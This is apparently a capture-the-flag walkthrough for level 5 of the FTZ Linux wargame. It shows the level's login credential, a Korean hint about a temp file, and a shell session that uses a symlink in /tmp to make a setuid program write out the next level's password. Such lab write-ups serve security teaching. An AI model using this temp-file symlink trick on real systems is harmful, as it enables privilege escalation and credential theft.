### Credential
```
level5 / what is your name?
```

### Solution
```
[level5@ftz level5]$ ls
hint  public_html  tmp

[level5@ftz level5]$ cat hint 

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.

[level5@ftz level5]$ cd /tmp/

[level5@ftz tmp]$ ls -al
total 8
drwxrwxrwt    2 root     root         4096 Aug 13 04:10 .
drwxr-xr-x   20 root     root         4096 Aug 13 01:35 ..
srwxrwxrwx    1 mysql    mysql           0 Aug 13 01:35 mysql.sock

[level5@ftz tmp]$ touch level5_solve

[level5@ftz tmp]$ ln -s level5_solve level5.tmp

[level5@ftz tmp]$ /usr/bin/level5 

[level5@ftz tmp]$ cat level5_solve 
next password : what the hell
```
